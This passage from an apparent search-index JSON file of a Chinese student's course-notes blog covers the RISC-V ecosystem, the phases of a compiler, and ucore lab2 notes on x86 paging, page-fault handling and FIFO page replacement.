\u591a\u4e2a\u516c\u53f8\u548c\u9ad8\u6821\u5728\u8d44\u52a9\u548c\u53c2\u4e0e RISC-V \u9879\u76ee\u3002\u5176\u4e2d\uff0c\u90e8\u5206\u4f01\u4e1a\u5df2\u7ecf\u5f00\u59cb\u5c06 RISC-V \u96c6\u6210\u5230\u4ea7\u54c1\u4e2d\u3002\u4f8b\u5982\u5168\u7403\u7b2c\u4e00\u5927\u786c\u76d8\u5382\u5546\u897f\u90e8\u6570\u636e\uff08Western Digital\uff09\u6700\u8fd1\u5ba3\u5e03\u5c06\u628a\u6bcf\u5e74\u5404\u7c7b\u5b58\u50a8\u4ea7\u54c1\u4e2d\u5d4c\u5165\u7684 10 \u4ebf\u4e2a\u5904\u7406\u5668\u6838\u6362\u6210 RISC-V\uff1bGoogle \u5229\u7528 RISC-V \u6765\u5b9e\u73b0\u4e3b\u677f\u63a7\u5236\u6a21\u5757\uff1bNVidia \u4e5f\u5c06\u5728 GPU \u4e0a\u5f15\u5165 RISC-V \u7b49\u3002\u6b64\u5916\uff0c\u56fd\u5185\u963f\u91cc\u5df4\u5df4\u3001\u534e\u4e3a\u3001\u8054\u60f3\u7b49\u516c\u53f8\u90fd\u5728\u9010\u6b65\u7814\u7a76\u5404\u81ea\u7684 RISC-V \u5b9e\u73b0\uff1b\u4e0a\u6d77\u5e02\u5c06 RISC-V \u5217\u4e3a\u91cd\u70b9\u6276\u6301\u9879\u76ee\uff1b\u5370\u5ea6\u653f\u5e9c\u4e5f\u6b63\u5728\u5927\u529b\u8d44\u52a9\u57fa\u4e8e RISC-V \u7684\u5904\u7406\u5668\u9879\u76ee\uff0c\u4f7f RISC-V \u6210\u4e3a\u4e86\u5370\u5ea6\u7684\u4e8b\u5b9e\u56fd\u5bb6\u6307\u4ee4\u96c6\u3002</p> <p>\u7531\u6b64\u53ef\u89c1\uff0cRISC-V \u56fd\u5185\u5916\u7684\u5174\u8d77\u4f7f\u5f97\u76ee\u524d RISC-V \u7684\u751f\u6001\u5df2\u7ecf\u6bd4\u8f83\u5b8c\u5584\u4e86\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#3-\u4e4b\u4e8e\u6784\u5efa\u5f00\u653e\u786c\u4ef6\u751f\u6001\u7684\u610f\u4e49","title":"3. \u4e4b\u4e8e\u6784\u5efa\u5f00\u653e\u786c\u4ef6\u751f\u6001\u7684\u610f\u4e49","text":"<p>2019 \u5e74\u5ea6\u56fd\u9645\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u65d7\u8230\u4f1a\u8bae ISCA \u4e8e 6 \u6708\u5728\u7f8e\u56fd\u4e9a\u5229\u6851\u90a3\u5dde\u51e4\u51f0\u57ce\u53ec\u5f00\uff0c\u4f1a\u8bae\u7684\u4e3b\u9898\u5373\u662f\u201c\u9762\u5411\u4e0b\u4e00\u4ee3\u8ba1\u7b97\u7684\u654f\u6377\u5f00\u653e\u786c\u4ef6\uff08Agile and Open Hardware for Next-Generation Computing\uff09\u201d\u3002\u7531\u6b64\u53ef\u89c1\u5f00\u653e\u786c\u4ef6\uff0c\u654f\u6377\u5f00\u53d1\u5df2\u6210\u4e3a\u672a\u6765\u7684\u8d8b\u52bf\u3002\u800c RISC-V \u5219\u521a\u597d\u6210\u4e3a\u8fd9\u8d8b\u52bf\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u73af\u3002</p> <p>\u76ee\u524d\u5f00\u6e90\u786c\u4ef6\u5f00\u53d1\u4e2d\u9762\u4e34\u7740 4 \u4e2a\u5173\u952e\u95ee\u9898 (Yungang Bao, Chinese Academy of Sciences, The Four Steps to An Open-Source Chip Design Ecosystem)\uff1a</p> <ol> <li>\u5f00\u653e\u7684\u6307\u4ee4\u96c6 ISA/\u5f00\u6e90 IPs/\u5f00\u6e90 Socs</li> <li>\u786c\u4ef6\u63cf\u8ff0\u8bed\u8a00 Lanuages/\u5f00\u6e90\u7684 EDA \u5de5\u5177</li> <li>\u9a8c\u8bc1\u548c\u4eff\u771f Vertification/Simulation</li> <li>OS/Complier</li> </ol> <p>RISC-V \u4fbf\u5904\u4e8e\u7b2c\u4e00\u73af\u4e2d\uff0c</p> <p>\u867d\u7136\u76ee\u524d\u6bcf\u4e2a\u73af\u8282\u90fd\u8fd8\u672a\u5b8c\u5168\u89e3\u51b3\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u76f8\u4fe1\uff0c\u5728\u672a\u6765\uff0c\u5f00\u53d1\u786c\u4ef6\u53ef\u4ee5\u50cf\u5f00\u53d1\u4e00\u4e2a\u8f6f\u4ef6\u4e00\u6837\u3002\u5145\u5206\u5229\u7528\u5df2\u5f00\u6e90\u7684\u8d44\u6e90\uff0c\u7528\u6237\u53ea\u9700\u8981\u5b9a\u5236 10% \u4ee5\u5185\u7684\u4ee3\u7801\uff0c\u4fbf\u53ef\u4ee5\u4ee5\u6708\u4e3a\u5355\u4f4d\u5f00\u53d1\u51fa\u5ba2\u5236\u5316\u7684\u786c\u4ef6\u7cfb\u7edf\u3002</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/01/07/2020-02-09-RISC-V-trend/#4-\u53c2\u8003\u8d44\u6599","title":"4. \u53c2\u8003\u8d44\u6599","text":"<p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V \u67b6\u6784\u4e4b\u9b42\uff08\u4e0a\uff09</p> <p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V \u67b6\u6784\u4e4b\u9b42\uff08\u4e2d\uff09</p> <p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V \u67b6\u6784\u4e4b\u9b42\uff08\u4e0b\uff09</p> <p>\u5f00\u653e\u6307\u4ee4\u96c6\u4e0e\u5f00\u6e90\u82af\u7247\u8fdb\u5c55\u62a5\u544a-v1p1\uff082019-02-22 \u66f4\u65b0\uff09</p> <p>\u8fdc\u666f\u7814\u8ba8\u4f1a\u7eaa\u8981\u2013\u9762\u5411\u4e0b\u4e00\u4ee3\u8ba1\u7b97\u7684\u5f00\u6e90\u82af\u7247\u4e0e\u654f\u6377\u5f00\u53d1</p>","tags":["risc-v"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/","title":"\u7f16\u8bd1\u539f\u7406\u603b\u7ed3","text":"","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#\u76ee\u524d\u6211\u773c\u4e2d\u7684\u8ba1\u7b97\u673a\u5c42\u6b21","title":"\u76ee\u524d\u6211\u773c\u4e2d\u7684\u8ba1\u7b97\u673a\u5c42\u6b21","text":"<ul> <li>\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\uff08RTL \u7ea7\u8bbe\u8ba1\uff0c\u6d41\u6c34\u7ebf\uff0c\u7f13\u5b58\uff0c\u591a\u53d1\u5c04\uff09</li> <li>ISA\uff08\u8bbf\u5b58\u6a21\u5f0f\uff0c\u4e2d\u65ad/\u5f02\u5e38\uff09</li> <li>\u6c47\u7f16\u8bed\u8a00\uff08\u5bc4\u5b58\u5668 + \u5185\u5b58\u7a7a\u95f4\uff09</li> <li>\u9ad8\u7ea7\u8bed\u8a00\uff08\u7f16\u8bd1\u5668\uff09</li> <li>\u64cd\u4f5c\u7cfb\u7edf\uff08\u5185\u6838\uff1a\u8fdb\u7a0b\u8c03\u5ea6\uff0c\u540c\u6b65\u4e0e\u6b7b\u9501\uff0c\u5185\u5b58\u7ba1\u7406\uff1a\u9875\u8868\uff0c\u6587\u4ef6\u7cfb\u7edf     \u5e94\u7528\uff1a\u684c\u9762\u7cfb\u7edf\uff0c\u6d4f\u89c8\u5668\uff09</li> </ul>","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#\u7f16\u8bd1\u5668\u5404\u9636\u6bb5","title":"\u7f16\u8bd1\u5668\u5404\u9636\u6bb5","text":"<ol> <li> <p>\u8bcd\u6cd5\u5206\u6790\uff1a\u89e3\u6790\u6e90\u4ee3\u7801\u6587\u4ef6\uff0c\u8f93\u51fa\u8bb0\u53f7\u6d41\u3002 \u8bb0\u53f7\u5373\u6307\u4e00\u4e2a\u6709\u72ec\u7acb\u610f\u4e49\u7684\u201c\u5355\u8bcd\u201d\u3002\u7a7a\u767d\u5b57\u7b26\u4fbf\u4e00\u822c\u4e0d\u5305\u542b\u610f\u4e49\uff0c\u6545\u53ef\u4ee5\u7701\u7565\u3002 \u8fd9\u4e9b\u5355\u8bcd\u4e00\u822c\u53ef\u5206\u7c7b\u4e3a\uff1a\u6807\u8bc6\u7b26\uff0c\u5e38\u6570\uff08\u6574\u6570\uff0c\u6d6e\u70b9\u6570\uff09\uff0c\u5b57\u7b26\u5e38\u91cf\uff0c\u5b57\u7b26\u4e32\uff0c \u64cd\u4f5c\u7b26\uff0c\u754c\u7b26\uff0c\u5173\u952e\u5b57\u3002</p> </li> <li> <p>\u8bed\u6cd5\u5206\u6790\uff1a\u5206\u6790\u8bb0\u53f7\u6d41\uff0c\u8f93\u51fa\u7a0b\u5e8f\u7684\u903b\u8f91\u7ed3\u6784\uff0c\u5982\u8bed\u6cd5\u5206\u6790\u6811\uff08\u6216 AST \u6811\uff09 \u4e00\u79cd\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219\u53ef\u4ee5\u88ab\u6587\u6cd5\u4ea7\u751f\u5f0f\u5b8c\u5168\u5b9a\u4e49\u3002 \u6587\u6cd5\u4e00\u822c\u5305\u62ec\u8868\u8fbe\u5f0f\u7684\u5b9a\u4e49\uff0c\u5404\u79cd\u8bed\u53e5\u7684\u5b9a\u4e49\uff08if, while, for\uff09\uff0c\u53d8\u91cf\u58f0\u660e\uff0c \u51fd\u6570\u5b9a\u4e49\u7b49\u3002</p> </li> </ol> <ol> <li> <p>\u8bed\u4e49\u5206\u6790\uff1a\u5206\u6790 AST \u6811\uff0c\u8f93\u51fa\u8bed\u4e49\u9519\u8bef\u4fe1\u606f \u5177\u4f53\u5305\u62ec\uff1a\u4f5c\u7528\u57df\u5206\u6790\uff0c\u53d8\u91cf\u7c7b\u578b\u68c0\u67e5\u3002 \u8fdb\u884c\u5206\u6790\u7684\u5de5\u5177\u4e3a\u7b26\u53f7\u8868\uff0c\u6545\u9700\u8981\u5bf9\u7b26\u53f7\u8868\u8fdb\u884c\u7ec4\u7ec7</p> </li> <li> <p>\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\uff1a\u8f93\u51fa\u4e2d\u95f4\u4ee3\u7801\uff0c\u66f4\u901a\u7528\u7684\u4e3a IR\uff08\u4e2d\u95f4\u8868\u793a\uff09\uff0c\u9664\u4e86 IR \u8bed\u8a00\u8fd8\u5305\u542b \u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u8868\u793a\u3002 \u4f5c\u7528\uff1a\u5206\u79bb\u524d\u7aef\u548c\u540e\u7aef\uff0c\u53ef\u4ee5\u66f4\u5bb9\u6613\u521b\u9020\u4e00\u79cd\u65b0\u8bed\u8a00\u6216\u79fb\u690d\u4e00\u79cd\u8bed\u8a00\u5230\u65b0\u7684\u67b6\u6784\u4e0a\u3002 \u7814\u7a76\u5bf9\u4e2d\u95f4\u4ee3\u7801\u7684\u4f18\u5316\u7684\u6280\u672f\u800c\u65e0\u9700\u8003\u8651\u5177\u4f53\u67b6\u6784\uff08\u5f53\u7136\u9488\u5bf9\u67b6\u6784\u7684\u4f18\u5316\u4e5f\u662f\u5f88\u91cd\u8981\u7684\uff09</p> </li> <li> <p>\u76ee\u6807\u4ee3\u7801\u751f\u6210\uff1a\u8f93\u51fa\u6c47\u7f16\u8bed\u8a00\u6216\u673a\u5668\u4ee3\u7801</p> </li> </ol>","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/","title":"ucore lab2 \u603b\u7ed3","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u56de\u987e\u5b9e\u9a8c 1\uff0c\u6211\u89c9\u5f97\u9700\u8981\u5b66\u4e60\u7684\u77e5\u8bc6\u6709\uff1a</p> <ol> <li>gdb\u5de5\u5177\u7684\u4f7f\u7528</li> <li>ELF\u6587\u4ef6\u7684\u683c\u5f0f\uff0c\u4ee5\u53ca readelf, objdump, objcopy \u5de5\u5177\u7684\u4f7f\u7528\uff08\u67e5\u770b\u5404\u4e2a section\uff0c\u67e5\u770b\u7b26\u53f7\u8868\uff09</li> <li>x86 \u6c47\u7f16\u57fa\u7840\uff08\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u6bb5\u5bc4\u5b58\u5668\uff0cEIP\uff0cEFLAG \u7b49\uff09\uff0cGCC\u5185\u8054\u6c47\u7f16\u683c\u5f0f\uff08AT&amp;T \u683c\u5f0f\uff09</li> <li>x86 \u5185\u5b58\u5206\u6bb5\u673a\u5236\uff08GDT \u8868\uff0c\u6bb5\u63cf\u8ff0\u7b26\uff09</li> <li>x86\u4e2d\u65ad\u5904\u7406\u673a\u5236\uff08IDT \u8868\uff0c\u4e2d\u65ad\u5411\u91cf -&gt; \u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff09</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\uff08BIOS-&gt;bootloader(\u7b2c\u4e00\u6247\u533a)-&gt;Kernel \u5404\u9636\u6bb5\u505a\u7684\u4e8b\u60c5\uff09</li> </ol> <p>\u800c\u505a\u5b8c\u5b9e\u9a8c 2 \u540e\uff0c\u6211\u89c9\u5f97\u9700\u8981\u5b66\u4e60\u7684\u77e5\u8bc6\u6709\uff1a</p> <ol> <li>BIOS \u63a2\u6d4b\u7269\u7406\u5185\u5b58\uff0cKernel \u6253\u5f00\u5206\u9875\u65f6\u81ea\u5e26\u4e00\u4e2a\u9875\u8868</li> <li>\u4e8c\u7ea7\u9875\u8868\u8fdb\u884c\u865a\u62df\u5730\u5740\u8f6c\u6362</li> <li>\u7269\u7406\u5185\u5b58\u7ba1\u7406 \u4e4b \u7a7a\u95f2\u5757(\u4ee5\u9875\u4e3a\u5355\u4f4d) \u7ba1\u7406\uff08Page \u6570\u636e\u7ed3\u6784\u548c\u7269\u7406\u9875\u7684\u5bf9\u5e94\uff0c\u7a7a\u95f2\u5757\u94fe\u8868 free_list\uff0cFirstHit \u5206\u914d\u8fde\u7eed\u7684\u7269\u7406\u9875\uff09</li> <li>\u865a\u62df\u5185\u5b58\u7ba1\u7406 \u4e4b \u6709\u6548\u865a\u62df\u9875\uff08\u8868\u793a\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u80fd\u4f7f\u7528\u7684\u865a\u62df\u5730\u5740\u6bb5\uff0cvma, mm \u6570\u636e\u7ed3\u6784\uff09</li> <li>\u5bfc\u81f4PageFault\u7684\u539f\u56e0\uff081. pte=0 \u5373\u4ece\u6765\u6ca1\u6709\u88ab\u52a0\u8f7d\u8fc7\uff0c2. \u88ab swap out, 3. \u8bbf\u95ee\u6743\u9650\u9519\u8bef\uff09</li> <li>FIFO \u9875\u66ff\u6362\u7b97\u6cd5\u5b9e\u73b0\uff08page struct \u589e\u52a0 pra_page_link, pra_vaddr\uff0cmm-&gt;sm_priv(pra_list_header) \u8bb0\u5f55\u6700\u8fd1\u4f7f\u7528\u7684\u9875\u5e8f\u5217\uff1bswap_manager\uff09</li> </ol> <p>\u4ee5\u4e0b\u4ecb\u7ecd\u4e00\u4e9b\u96be\u70b9</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u6d41\u7a0b","title":"\u6d41\u7a0b","text":"","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u542f\u52a8\u65f6\u7684\u9875\u8868","title":"\u542f\u52a8\u65f6\u7684\u9875\u8868","text":"<p>\u7531\u4e8e bootloader \u52a0\u8f7d\u5185\u6838\u65f6\uff0c\u5c06\u5730\u5740\u4e0e\u4e0a\u4e86\u4e00\u4e2a 0xfff_ffff\uff0c\u5373\u62b9\u53bb\u4e86\u6700\u9ad8\u4f4d\u3002\u800c\u5185\u6838\u7684\u865a\u5730\u5740\u4e3a 0xc010_0000 ~ 0xc012_4118\u3002\u56e0\u6b64\u7ebf\u6027\u5730\u5740\u4e0e\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u5173\u7cfb\u4e3a\uff1a</p> <pre><code>\u7ebf\u6027\u5730\u5740 = \u7269\u7406\u5730\u5740 + 0xc000_0000\n</code></pre> <p>\u5185\u6838\u81ea\u5e26\u4e00\u4e2a\u9875\u76ee\u5f55\u8868 (4KB) \u548c\u4e00\u4e2a\u9875\u8868 (4KB) \u7528\u4e8e\u5b8c\u6210\u8be5\u6620\u5c04\uff08\u6620\u5c04\u4e86 4M \u7684\u7a7a\u95f4\uff09</p> <p>x86 \u6253\u5f00\u5206\u9875\u673a\u5236\uff0c\u53ea\u9700\u63d0\u524d\u5c06\u9875\u76ee\u5f55\u8868\u7684\u8d77\u59cb\u5730\u5740\u52a0\u8f7d\u5230 cr3 \u5bc4\u5b58\u5668\uff0c\u7136\u540e\u7f6e\u4e0a cr3 \u7684\u67d0\u4e00\u4f4d\u5373\u53ef \u4e4b\u540e\uff0ccpu \u6bcf\u6b21\u53d1\u51fa\u7684\u5730\u5740\u90fd\u4f1a\u88ab\u786c\u4ef6\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#\u81ea\u6620\u5c04","title":"\u81ea\u6620\u5c04","text":"<p>\u4e3b\u8981\u4f5c\u7528\u662f\u901a\u8fc7\u8bbf\u95ee\u5730\u5740<code>VPT+offset</code>\uff0c\u4fbf\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u4e00\u4e2a\u9875\u8868\u9879\uff084G \u865a\u62df\u5730\u5740\u7a7a\u95f4\u6700\u591a\u6709 1M \u4e2a\u9875\u8868\u9879\uff09\uff0c\u800c\u4e0d\u7528\u5148\u8bbf\u95ee\u4e00\u6b21\u9875\u76ee\u5f55\u9879\uff0c\u8f6c\u6362\u6210\u865a\u62df\u5730\u5740\u540e\u518d\u8bbf\u95ee\u9875\u8868\u9879\u3002</p> <p>VPT \u662f\u4e00\u4e2a 4M \u5bf9\u9f50\u7684\u5730\u5740\uff08\u4f4e 22 \u4f4d\u4e3a 0\uff09</p> <pre><code>boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W\npte_t * const vpt = (pte_t *) VPT\npde_t * const vpd = (pde_t *) PGADDR((PDX(VPT), PDX(VPT), 0)\n</code></pre> <p>\u7ecf\u8fc7\u4e0a\u9762\u7684\u6b65\u9aa4\u540e\u8003\u8651\u8bbf\u95ee\u865a\u62df\u5730\u5740 vpt \u548c vpd \u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f \u8bbf\u95ee vpt \u65f6\uff0c\u7ecf\u8fc7\u9875\u76ee\u5f55\u8868\u7684\u6620\u5c04\uff0c\u6620\u5c04\u5230 boot_pgdir \u81ea\u8eab\uff0c\u518d\u7ecf\u8fc7\u4e00\u5c42\u6620\u5c04\uff08boot_pgdir \u4f5c\u4e3a\u9875\u8868\uff09\uff0c\u8bbf\u95ee\u4e86 boot_pgdir[0]\u5bf9\u5e94\u7684\u9875\u8868\u7684\u7b2c\u4e00\u4e2a\u9875\u8868\u9879\u3002 \u4f9d\u6b21\u8bbf\u95ee vpt \u540e\u7684 4M \u5730\u5740\u7a7a\u95f4\uff0c\u4fbf\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a 1M \u4e2a\u9875\u8868\u9879 pte \u8bbf\u95ee vpd \u65f6\uff0cvpd \u5219\u88ab\u6620\u5c04\u5230 boot_pgdir \u81ea\u8eab\u6240\u5728\u9875\u7684\u8d77\u59cb\u5730\u5740\uff0c\u56e0\u6b64\u8bbf\u95ee vpd \u540e\u7684 4KB \u7a7a\u95f4\uff0c\u53ef\u8bbf\u95ee\u6240\u6709\u7684\u9875\u76ee\u5f55\u9879\u3002</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#print_pgdir-\u8f93\u51fa","title":"print_pgdir \u8f93\u51fa","text":"<p>-------------------- BEGIN -------------------- PDE(0e0) c0000000-f8000000 38000000 urw   |-- PTE(38000) c0000000-f8000000 38000000 -rw PDE(001) fac00000-fb000000 00400000 -rw   |-- PTE(000e0) faf00000-fafe0000 000e0000 urw   |-- PTE(00001) fafeb000-fafec000 00001000 -rw --------------------- END ---------------------</p> <p>print_pgdir \u7684\u4f5c\u7528\u662f\u8f93\u51fa\u9875\u76ee\u5f55\u8868\u548c\u9875\u8868\u7684\u6574\u4f53\u60c5\u51b5\uff0c\u6309\u7167\u88ab\u8fde\u7eed\u6620\u5c04\u7684\u865a\u62df\u5730\u5740\u5757\u7684\u5f62\u5f0f\u8f93\u51fa\u3002</p> <p>print_pgdir \u5148\u901a\u8fc7 vpd \u8bbf\u95ee boot_pgdir\uff0c\u627e\u5230\u4e00\u4e2a\u88ab\u8fde\u7eed\u6620\u5c04\u7684\u865a\u62df\u5730\u5740\u5757\uff08\u4ee5 4M \u4e3a\u5355\u4f4d\uff09\uff0c\u63a5\u7740\u8fdb\u4e00\u6b65\u901a\u8fc7 vpt \u8bbf\u95ee\u9875\u8868\u9879\u627e\u5230\u66f4\u7cbe\u786e\u7684\u8fde\u7eed\u865a\u62df\u5730\u5740\u5757\uff08\u4ee5 4KB \u4e3a\u5355\u4f4d\uff09\u3002\uff08\u4e0a\u9762\u5df2\u7ecf\u8bf4\u660e\u53ef\u4ee5\u901a\u8fc7 vpt \u8bbf\u95ee\u6574\u4e2a 1M \u9879 pte\uff09</p> <p></p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#pagefault-\u5904\u7406","title":"PageFault \u5904\u7406","text":"<pre><code>pagefault\u53d1\u751f -&gt; (vector14-&gt;__all_traps-&gt;trap)-&gt;trap_dispatch-&gt;pgfault_handler-&gt;do_pgfault\n</code></pre> <p>\u6700\u5173\u952e\u7684\u4e3a do_pgfault \u51fd\u6570\uff0c\u4f4d\u4e8e vmm.c \u4e2d</p> <p>\u4e3b\u8981\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u8c03\u7528 find_vma\uff0c\u68c0\u67e5\u5f15\u8d77\u5f02\u5e38\u7684\u662f\u5426\u4e3a\u6709\u6548\u7684\u865a\u62df\u5730\u5740</li> <li>\u68c0\u67e5\u6743\u9650\uff08\u6ca1\u592a\u770b\u61c2\u4f5c\u7528\uff09</li> <li>\u8c03\u7528 get_pte\uff0c\u5982\u679c pte \u5168\u4e3a 0\uff0c\u8868\u793a\u7b2c\u4e00\u6b21\u8bbf\u95ee\uff0c\u8c03\u7528 pgdir_alloc_page \u968f\u673a\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875</li> <li>\u5982\u679c pte \u4e3a\u4e00\u4e2a swap \u9879\uff08\u4e4b\u524d\u88ab\u6362\u51fa\u8fc7\uff09\uff0c\u5219\u8c03\u7528swap_in\u51fd\u6570\uff08\u8c03\u7528 alloc_page \u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u518d\u8c03\u7528 swapfs_read \u51fd\u6570\u5c06\u9875\u4ece\u78c1\u76d8\u6362\u5165\u5230\u5185\u5b58\uff08\u8be5\u7269\u7406\u9875\uff09\uff09\u3002\u6700\u540e\u66f4\u65b0\u9875\u8868\u9879\uff0c\u8ba9\u5176\u6307\u5411\u8be5\u7269\u7406\u9875\u3002\u7136\u540e\u8c03\u7528 swap_map_swappable \u5c06\u8be5\u7269\u7406\u9875\u6dfb\u52a0\u5230 FIFO \u4e2d\uff08swap manager \u7ef4\u62a4\u7684\u94fe\u8868\uff09</li> </ol> <p>\u6ce8\uff1a</p> <ol> <li>\u5176\u4e2d\u7684 pgdir_alloc_page \u51fd\u6570\u53ea\u5728\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86\u3002\u4f5c\u7528\u662f\u8c03\u7528 alloc_page \u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230 FIFO \u4e2d</li> <li>alloc_page \u51fd\u6570\u5728\u7a7a\u95f2\u5757\u4e0d\u591f\u65f6\uff0c\u4fbf\u4f1a\u8c03\u7528swap_out\u51fd\u6570\u3002swap_out \u8fc7\u7a0b\u5982\u4e0b\uff1a<ol> <li>\u8c03\u7528 swap_out_victim \u51fd\u6570\u627e\u5230\u88ab\u66ff\u6362\u7684\u9875 page\uff08FIFO \u7ed3\u5c3e\uff09</li> <li>\u8c03\u7528 swapfs_write \u51fd\u6570\u5c06\u8be5\u7269\u7406\u9875\u4ece\u5185\u5b58\u5199\u5230\u78c1\u76d8\uff08\u6247\u533a\u53f7\u5bf9\u5e94 page-&gt;pra_vaddr\uff09</li> <li>\u901a\u8fc7 page-&gt;pra_vaddr \u67e5\u627e\u9875\u8868\uff0c\u5e76\u66f4\u65b0\u5bf9\u5e94 pte \u4e3a swap \u9879\uff08\u8fd9\u91cc\u5982\u679c\u9047\u5230\u591a\u4e2a\u865a\u62df\u5730\u5740\u5bf9\u5e94\u4e00\u4e2a\u7269\u7406\u5730\u5740\u7684\u60c5\u51b5\u600e\u4e48\u529e\u5462\uff1f\uff09</li> </ol> </li> </ol> <p>\u5b58\u5728\u8c03\u7528\u94fe kern_init()-&gt;vmm_init()-&gt;check_pgfault()</p> <p>\u5176\u4e2d check_pgfault \u51fd\u6570\u5728\u8bbf\u95ee\u5730\u5740 0x100 \u65f6\u4f1a\u89e6\u53d1 pte \u5168 0 \u7684 pagefault\uff0c\u5206\u914d\u7269\u7406\u9875\u540e\u4fbf\u4e0d\u4f1a\u518d\u4ea7\u751f\u4e86\u3002</p> <p>\uff08\u540e\u9762\u5206\u6790 check_swap \u4f1a\u4ea7\u751f\u89e6\u53d1 swap \u7684 page fault\uff09</p>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2020/09/14/2020-09-14-ucore-lab2%E6%80%BB%E7%BB%93/#fifo-\u9875\u66ff\u6362\u8fc7\u7a0b-check_swap-\u8fc7\u7a0b","title":"FIFO \u9875\u66ff\u6362\u8fc7\u7a0b (check_swap \u8fc7\u7a0b)","text":"<p>\u5b58\u5728\u8c03\u7528\u94fe kern_init()-&gt;swap_init()-&gt;check_swap()</p> <p>\u4e0b\u9762\u5206\u6790 check_swap \u7684\u6574\u4e2a\u8fc7\u7a0b</p> <ol> <li>\u8bbe\u7f6e\u73af\u5883\uff0c\u6700\u7ec8\uff1a1. \u7a7a\u95f2\u5757\u94fe\u8868\u5305\u542b 4 \u4e2a\u7269\u7406\u9875\u30022. \u8bbe\u7f6e vma\uff0c0x1000~0x5000 \u90fd\u662f\u6709\u6548\u7684\u865a\u62df\u5730\u5740</li> <li>\u8c03\u7528 check_content_set()\uff0c\u4f9d\u6b21\u5199\u4e86 0x1000, 0x2000, ..., 0x4000 \u56db\u4e2a\u5730\u5740\uff08\u5206\u522b\u7528 a, b, c, d \u8868\u793a\uff09\uff0c\u89e6\u53d1\u56db\u6b21\u521d\u59cb page fault\u3002\u6b64\u65f6\u5df2\u7ecf\u6ca1\u6709\u7a7a\u95f2\u9875\u4e86</li> <li>\u8c03\u7528 check_content_access\uff0c\u4f9d\u6b21\u8bbf\u95ee c, a, d, b, e, b, a, b, c, d, e<ol> <li>\u8bbf\u95ee c, a, d, b</li> <li>\u8bbf\u95ee e \u65f6 pgfault\uff0cpte \u5168 0\uff0c\u8c03\u7528 alloc_page \u5bfc\u81f4 swap out \u51fa a \u5bf9\u5e94\u7684\u7269\u7406\u9875\uff0c\u6807\u8bb0 a \u7684\u9875\u8868\u9879\u4e3a swap \u9879</li> <li>\u8bbf\u95ee b</li> <li>\u8bbf\u95ee a \u65f6 pgfault\uff0cpte \u4e3a swap \u9879\uff0c\u8c03\u7528 swap in\uff0cswap in \u8c03\u7528 alloc_page \u53c8\u5bfc\u81f4 swap out \u51fa b \u5bf9\u5e94\u7684\u7269\u7406\u9875\uff0c\u6807\u8bb0 b \u7684\u9875\u8868\u9879\u4e3a swap \u9879\uff0c\u66f4\u65b0 a 